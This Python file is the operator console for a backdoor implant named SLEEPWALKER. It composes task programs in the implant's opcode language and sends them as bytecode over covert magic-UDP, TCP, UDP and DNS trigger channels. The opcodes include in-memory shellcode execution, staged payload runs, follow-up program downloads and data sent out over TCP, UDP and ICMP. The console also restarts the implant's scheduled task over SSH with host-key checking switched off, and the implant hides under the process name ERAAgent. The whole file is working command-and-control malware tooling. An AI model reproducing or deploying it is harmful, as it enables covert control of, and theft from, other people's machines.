#!/usr/bin/env python3
"""
sleepwalker_tui - interactive operator console for the SLEEPWALKER implant.

Builds task programs in the implant's 23-opcode DSL, compiles them to
bytecode, and sends them to the running implant over any of its trigger
channels (magic-over-UDP, TCP, UDP, DNS). Also restarts the implant via the
'sleepwalker' scheduled task over SSH.

Run (from repo root):
    .venv/bin/python tools/sw_tui.py

Target/credentials default to the lab host and can be overridden with the
SW_HOST / SW_USER / SW_PASS environment variables or at the config prompt.
"""

from __future__ import annotations

import os
import socket
import struct
import subprocess
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from swctl import framing
from swctl.bytecode import SPECS, compile_program, decode_program, render_tree
from swctl import _cfg as keys_cfg

from rich.console import Console
from rich.markup import escape
from rich.panel import Panel
from rich.table import Table
from prompt_toolkit import prompt as _prompt

CONSOLE = Console()

# --------------------------------------------------------------------------
# Config
# --------------------------------------------------------------------------
@dataclass
class Config:
    host: str = os.environ.get("SW_HOST", "192.168.1.100")
    user: str = os.environ.get("SW_USER", "operator")
    password: str = os.environ.get("SW_PASS", "ChangeMe123!")
    magic_port: int = int(os.environ.get("SW_MAGIC_PORT", "9999"))
    task: str = "sleepwalker"
    dll_dir: str = r"C:\Users\operator\swtest"

CFG = Config()

# --------------------------------------------------------------------------
# SSH helper (used for restart)
# --------------------------------------------------------------------------
def _ssh(cmd: str) -> str:
    r = subprocess.run(
        ["sshpass", "-p", CFG.password, "ssh", "-o", "StrictHostKeyChecking=no",
         f"{CFG.user}@{CFG.host}", cmd],
        capture_output=True, text=True, encoding="utf-8", errors="replace",
        timeout=90,
    )
    keep = []
    for ln in r.stdout.splitlines():
        if ln.startswith(("WARNING", "**", "Host key", "|", "+--",
                          "CONNECTED", "The authenticity")):
            continue
        keep.append(ln)
    return "\n".join(keep).strip()

# --------------------------------------------------------------------------
# Transports
# --------------------------------------------------------------------------
def compile_dsl(text: str) -> bytes:
    return compile_program(text)

def transport_magic_udp(prog: bytes) -> str:
    pkt = framing.build_magic_packet(prog)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.sendto(pkt, (CFG.host, CFG.magic_port))
    return f"magic-over-UDP -> {CFG.host}:{CFG.magic_port}"

def transport_udp(prog: bytes, port: int) -> str:
    env = framing.seal_task(prog)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.sendto(env, (CFG.host, port))
    return f"UDP {CFG.host}:{port} (UDP_BIND_RECV)"

def transport_tcp(prog: bytes, port: int) -> str:
    env = framing.seal_task(prog)
    frame = len(env).to_bytes(2, "big") + env
    with socket.create_connection((CFG.host, port), timeout=15) as s:
        s.sendall(frame)
    return f"TCP {CFG.host}:{port} (TCP_LISTEN_RECV)"

def transport_dns(prog: bytes) -> str:
    from swctl.framing import dns_qname
    qname = dns_qname(prog)
    def enc_name(name: str) -> bytes:
        out = b""
        for lbl in name.rstrip(".").split("."):
            out += bytes([len(lbl)]) + lbl.encode()
        return out + b"\x00"
    pkt = (struct.pack(">HHHHHH", 0x1337, 0x0100, 1, 0, 0, 0)
           + enc_name(qname) + struct.pack(">HH", 1, 1))
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.sendto(pkt, (CFG.host, 53))
    return "DNS query -> :53 (SNIFF_MAGIC_DNS)"

def restart_implant() -> str:
    _ssh(f"schtasks /End /TN {CFG.task} 2>nul")
    time.sleep(1)
    _ssh(f"schtasks /Run /TN {CFG.task} 2>nul")
    time.sleep(2)
    pid = _ssh("powershell -NoProfile -Command "
               "(Get-Process ERAAgent -ErrorAction SilentlyContinue).Id")
    return pid or "NOT RUNNING"

def send_program(prog: bytes, transport: str):
    if transport == "magic":
        CONSOLE.print(transport_magic_udp(prog))
    elif transport == "udp":
        port = int(input_int("target UDP bind port", 9004))
        CONSOLE.print(transport_udp(prog, port))
    elif transport == "tcp":
        port = int(input_int("target TCP listen port", 9003))
        CONSOLE.print(transport_tcp(prog, port))
    elif transport == "dns":
        CONSOLE.print(transport_dns(prog))
    else:
        raise ValueError(transport)

# --------------------------------------------------------------------------
# Interactive input helpers
# --------------------------------------------------------------------------
def input_int(label: str, default: int | None = None) -> int | None:
    suffix = f" [{default}]" if default is not None else ""
    val = _prompt(f"{label}{suffix}: ")
    if not val.strip():
        return default
    try:
        return int(val, 0)
    except ValueError:
        CONSOLE.print(f"[red]invalid integer: {val}[/red]")
        return input_int(label, default)

def input_str(label: str, default: str = "") -> str:
    suffix = f" [{default}]" if default else ""
    val = _prompt(f"{label}{suffix}: ")
    return val.strip() if val.strip() else default

def input_data(label: str, default: str = "") -> str:
    """A blob/string token. Accepts 0x.. hex or plain text."""
    return input_str(label, default)

def _prompt_multiline(instruction: str) -> str:
    """Read a multi-line DSL program. Type 'END' (or a blank line) to finish.

    prompt_toolkit's prompt() is single-line, so we loop one line at a time.
    """
    CONSOLE.print(instruction)
    lines: list[str] = []
    while True:
        line = _prompt("... ")
        stripped = line.strip()
        if stripped == "END":
            break
        if stripped == "":
            if lines:
                break
            continue
        lines.append(line)
    return "\n".join(lines)

# --------------------------------------------------------------------------
# Trigger-channel guidance
# --------------------------------------------------------------------------
# These opcodes hold the interpreter (and with it the raw-sniffer trigger
# thread) until they finish, so a subsequent magic packet is not received
# until the implant is restarted.
_BLOCKING_OPS = {
    "CRON_SCHEDULE", "LOOP_FOREVER",
    "TCP_CONNECT_RECV", "TCP_LISTEN_RECV", "UDP_BIND_RECV",
    "PIPE_CLIENT_RECV", "PIPE_SERVER_RECV",
}

def _blocking_names(prog: bytes) -> list[str]:
    found: list[str] = []
    try:
        nodes = decode_program(prog)
    except Exception:
        return found
    stack = list(nodes)
    while stack:
        n = stack.pop()
        if n.name in _BLOCKING_OPS and n.name not in found:
            found.append(n.name)
        for label, val in n.fields:
            if label == "script":
                stack.extend(val)
    return found

def _after_send_advice(prog: bytes) -> str:
    blocking = _blocking_names(prog)
    if blocking:
        return ("This task contains " + ", ".join(blocking) +
                ": it holds the trigger channel, so use [b]Restart[/b] before "
                "sending the next magic packet.")
    return "Trigger channel stays open - you can send another magic packet now."

def _transport_hint() -> str:
    return ("transport [magic/tcp/udp/dns]: magic is reliable right after a "
            "restart; tcp/udp/dns only work if the implant is already "
            "listening/binding from a prior task")

# --------------------------------------------------------------------------
# DSL program builder
# --------------------------------------------------------------------------
FIELD_HINTS = {
    "s": "string (use * for wildcard)",
    "blob": "bytes (0x<hex> or literal text)",
    "script": "nested program",
    "u8": "integer 0-255",
    "u16": "integer 0-65535",
    "u32": "integer",
    "u64": "integer",
    "lzma": "5-byte props (0x<hex>)",
}

OPCODE_ORDER = [
    "EXIT", "SPAWN_THREAD_SCRIPT",
    "SLEEP_SECONDS", "SLEEP_RANDOM", "CRON_SCHEDULE", "REPEAT_N", "LOOP_FOREVER",
    "TCP_SEND", "UDP_SEND", "ICMP_SEND", "PIPE_SEND",
    "TCP_CONNECT_RECV", "TCP_LISTEN_RECV", "UDP_BIND_RECV",
    "PIPE_CLIENT_RECV", "PIPE_SERVER_RECV",
    "STAGE_WRITE", "STAGE_VERIFY_EXEC", "DECOMPRESS_RUN",
    "RUN_SHELLCODE", "RUN_FILE_SCRIPT",
    "SNIFF_MAGIC", "SNIFF_MAGIC_DNS",
]

def opcode_descriptions() -> dict:
    return {
        "EXIT": "set the process-wide stop flag (halts everything)",
        "SPAWN_THREAD_SCRIPT": "run a nested program on its own thread",
        "SLEEP_SECONDS": "pause N seconds",
        "SLEEP_RANDOM": "pause a random 0..N seconds",
        "CRON_SCHEDULE": "run nested program on a minute/hour/day/dow schedule",
        "REPEAT_N": "run nested program N times",
        "LOOP_FOREVER": "run nested program forever",
        "TCP_SEND": "send data over TCP",
        "UDP_SEND": "send data over UDP",
        "ICMP_SEND": "send data inside an ICMP ping",
        "PIPE_SEND": "write data to a named pipe (optional creds)",
        "TCP_CONNECT_RECV": "connect out and receive a follow-up program",
        "TCP_LISTEN_RECV": "listen and receive a follow-up program",
        "UDP_BIND_RECV": "bind UDP and receive a follow-up program",
        "PIPE_CLIENT_RECV": "connect to a pipe and receive a follow-up program",
        "PIPE_SERVER_RECV": "create a pipe and receive a follow-up program",
        "STAGE_WRITE": "write a chunk into the 128KB staging area",
        "STAGE_VERIFY_EXEC": "verify SHA-256 of staged bytes, then run",
        "DECOMPRESS_RUN": "decompress an LZMA block and run as a program",
        "RUN_SHELLCODE": "execute raw machine code in memory",
        "RUN_FILE_SCRIPT": "read, decrypt and run a file",
        "SNIFF_MAGIC": "watch for the raw trigger packet",
        "SNIFF_MAGIC_DNS": "watch for raw + DNS triggers",
    }

def build_program(level: int = 0) -> str:
    """Interactively compose a DSL program. Returns the program text."""
    frags: list[str] = []
    desc = opcode_descriptions()
    while True:
        CONSOLE.print(Panel(
            "\n".join(f"[bold cyan]{n:22}[/bold cyan] {desc[n]}"
                      for n in OPCODE_ORDER),
            title=f"Choose an instruction (program level {level})",
            border_style="blue"))
        choice = _prompt("opcode name, 'done' to finish, 'list' to re-show: ")
        name = choice.strip().upper()
        if name in ("", "DONE", "Q"):
            break
        if name == "LIST":
            continue
        if name not in SPECS:
            CONSOLE.print(f"[red]unknown opcode: {name}[/red]")
            continue
        frags.append(build_instruction(name, level))
    return "\n".join(frags)

def build_instruction(name: str, level: int) -> str:
    _op, kinds = SPECS[name]
    parts: list[str] = [name]
    hints = {
        "SLEEP_SECONDS": ["duration seconds"],
        "SLEEP_RANDOM": ["max seconds"],
        "CRON_SCHEDULE": ["minute bitmask u64", "hour bitmask u32",
                          "day-of-month bitmask u32", "weekday bitmask u8"],
        "REPEAT_N": ["repeat count"],
        "STAGE_WRITE": ["buffer offset"],
        "STAGE_VERIFY_EXEC": ["verified length"],
        "DECOMPRESS_RUN": ["unpacked size"],
        "TCP_SEND": ["local addr", "local port", "remote host", "remote port",
                     "payload", "deadline"],
        "UDP_SEND": ["local addr", "local port", "remote host", "remote port",
                     "payload", "deadline"],
        "ICMP_SEND": ["source addr", "remote host", "payload", "deadline"],
        "PIPE_SEND": ["server", "pipe", "username", "password", "payload",
                      "deadline"],
        "TCP_CONNECT_RECV": ["local addr", "local port", "remote host",
                             "remote port", "deadline"],
        "TCP_LISTEN_RECV": ["bind addr", "bind port", "deadline"],
        "UDP_BIND_RECV": ["bind addr", "bind port", "deadline"],
        "PIPE_CLIENT_RECV": ["server", "pipe", "username", "password",
                             "deadline"],
        "PIPE_SERVER_RECV": ["pipe name", "reserved", "deadline"],
        "SNIFF_MAGIC": ["interface", "deadline"],
        "SNIFF_MAGIC_DNS": ["interface", "deadline"],
        "RUN_FILE_SCRIPT": ["file path"],
        "RUN_SHELLCODE": ["shellcode (0x hex)"],
        "SPAWN_THREAD_SCRIPT": ["nested"],
        "LOOP_FOREVER": ["nested"],
    }
    h = hints.get(name, [])
    hmap = {kind: f"{kind} [{FIELD_HINTS[kind]}]" for kind in kinds}
    for i, kind in enumerate(kinds):
        hint = h[i] if i < len(h) else hmap.get(kind, kind)
        if kind == "script":
            inner = build_program(level + 1)
            parts.append("{ " + inner.replace("\n", " ") + " }")
        elif kind == "lzma":
            parts.append(input_data(f"  {name}: lzma_properties {hint}", "0x0005fffc48"))
        elif kind in ("u8", "u16", "u32", "u64"):
            parts.append(str(input_int(f"  {name}: {hint}", 0)))
        else:
            d = "*" if kind == "s" and hint.startswith("local") or hint == "bind addr" else ""
            parts.append(input_data(f"  {name}: {hint}", d))
    return " ".join(parts)

# --------------------------------------------------------------------------
# Main menu
# --------------------------------------------------------------------------
def main_menu() -> str:
    CONSOLE.print(Panel(
        f"[bold]SLEEPWALKER operator console[/bold]\n"
        f"target: [cyan]{CFG.host}[/cyan]  magic port: [cyan]{CFG.magic_port}[/cyan]  "
        f"user: [cyan]{CFG.user}[/cyan]  task: [cyan]{CFG.task}[/cyan]\n\n"
        "[1] Build & send a program\n"
        "[2] Quick-send raw DSL\n"
        "[3] Restart implant\n"
        "[4] Send over a specific transport\n"
        "[5] Show compiled program from DSL\n"
        "[c] Configure target\n"
        "[k] Show / set key config (config.json)\n"
        "[q] Quit",
        title="Main menu", border_style="green"))
    return _prompt("choice: ").strip().lower()

def show_program(prog: bytes):
    try:
        nodes = decode_program(prog)
        tree = render_tree(nodes)
        CONSOLE.print(Panel(tree, title=f"Decoded program ({len(prog)} bytes)",
                            border_style="cyan"))
    except Exception as e:
        CONSOLE.print(f"[yellow]could not decode: {e}[/yellow]")
    CONSOLE.print(f"[dim]bytecode: {prog.hex()}[/dim]")

def _key_config_menu():
    """Show the active key config and offer to edit it in config.json.

    The implant reads the same config.json at build time (via
    build/swconfig.h), so after changing a value here the DLL must be
    rebuilt and redeployed before it takes effect.
    """
    try:
        cfg = keys_cfg.load()
    except SystemExit as e:
        CONSOLE.print(f"[red]{e}[/red]")
        return
    src = cfg.get("source") or "(no config.json found - built-in defaults)"
    rows = [
        ("aes_key", cfg["aes_key"].hex()),
        ("config_nonce", cfg["config_nonce"].hex()),
        ("cron_xor_key", cfg["cron_xor_key"].hex()),
        ("sniff_xor_const", f"0x{cfg['sniff_xor_const']:04X}"),
    ]
    t = Table(title=f"Active key config: {escape(src)}", border_style="magenta")
    t.add_column("field", style="bold cyan")
    t.add_column("value")
    for name, val in rows:
        t.add_row(name, val)
    CONSOLE.print(t)
    CONSOLE.print("[dim]unmodified fields fall back to the built-in defaults "
                  "in include/sw_core.h[/dim]")
    edit = input_str("edit config.json? [y/N]", "").strip().lower()
    if edit not in ("y", "yes"):
        return
    try:
        if sys.platform == "darwin":
            subprocess.run(["open", src], check=False)
        else:
            subprocess.run(["xdg-open", src], check=False)
        CONSOLE.print(f"[green]opened {src} - after saving, rebuild the DLL "
                      "(make win32) and redeploy for changes to take effect[/green]")
    except Exception as e:
        CONSOLE.print(f"[yellow]could not open {src}: {e}[/yellow]")

def run():
    CONSOLE.print(Panel("[bold cyan]SLEEPWALKER[/bold cyan] - passive backdoor "
                        "operator console", border_style="cyan"))
    while True:
        choice = main_menu()
        if choice == "q":
            break
        elif choice == "1":
            dsl = build_program()
            if not dsl.strip():
                CONSOLE.print("[yellow]empty program[/yellow]")
                continue
            CONSOLE.print(Panel(dsl, title="Program", border_style="yellow"))
            try:
                prog = compile_dsl(dsl)
            except Exception as e:
                CONSOLE.print(f"[red]compile error: {e}[/red]")
                continue
            show_program(prog)
            transport = _prompt(_transport_hint() + ": ").strip() or "magic"
            try:
                send_program(prog, transport)
                CONSOLE.print("[green]sent[/green]")
                CONSOLE.print(_after_send_advice(prog))
            except Exception as e:
                CONSOLE.print(f"[red]send error: {e}[/red]")
        elif choice == "2":
            dsl = _prompt_multiline(
                "Quick-send DSL - one instruction per line; type END or a "
                "blank line to finish:")
            if not dsl.strip():
                CONSOLE.print("[yellow]empty program[/yellow]")
                continue
            try:
                prog = compile_dsl(dsl)
            except Exception as e:
                CONSOLE.print(f"[red]compile error: {e}[/red]")
                continue
            show_program(prog)
            transport = _prompt(_transport_hint() + ": ").strip() or "magic"
            try:
                send_program(prog, transport)
                CONSOLE.print("[green]sent[/green]")
                CONSOLE.print(_after_send_advice(prog))
            except Exception as e:
                CONSOLE.print(f"[red]send error: {e}[/red]")
        elif choice == "3":
            pid = restart_implant()
            CONSOLE.print(f"[green]implant restarted, PID={pid}[/green]")
        elif choice == "4":
            dsl = _prompt_multiline(
                "DSL (one instruction per line; END or blank line to finish):")
            if not dsl.strip():
                CONSOLE.print("[yellow]empty program[/yellow]")
                continue
            try:
                prog = compile_dsl(dsl)
            except Exception as e:
                CONSOLE.print(f"[red]compile error: {e}[/red]")
                continue
            show_program(prog)
            transport = _prompt(_transport_hint() + ": ").strip() or "magic"
            try:
                send_program(prog, transport)
                CONSOLE.print("[green]sent[/green]")
                CONSOLE.print(_after_send_advice(prog))
            except Exception as e:
                CONSOLE.print(f"[red]send error: {e}[/red]")
        elif choice == "5":
            dsl = _prompt_multiline(
                "Show compiled program from DSL (END or blank line to finish):")
            try:
                prog = compile_dsl(dsl)
                show_program(prog)
            except Exception as e:
                CONSOLE.print(f"[red]{e}[/red]")
        elif choice == "c":
            CFG.host = input_str("target host", CFG.host)
            CFG.user = input_str("ssh user", CFG.user)
            CFG.password = input_str("ssh password", CFG.password)
            CFG.magic_port = int(input_int("magic port", CFG.magic_port))
        elif choice == "k":
            _key_config_menu()
        else:
            CONSOLE.print("[red]unknown choice[/red]")

if __name__ == "__main__":
    try:
        run()
    except (KeyboardInterrupt, EOFError):
        CONSOLE.print("\n[dim]bye[/dim]")
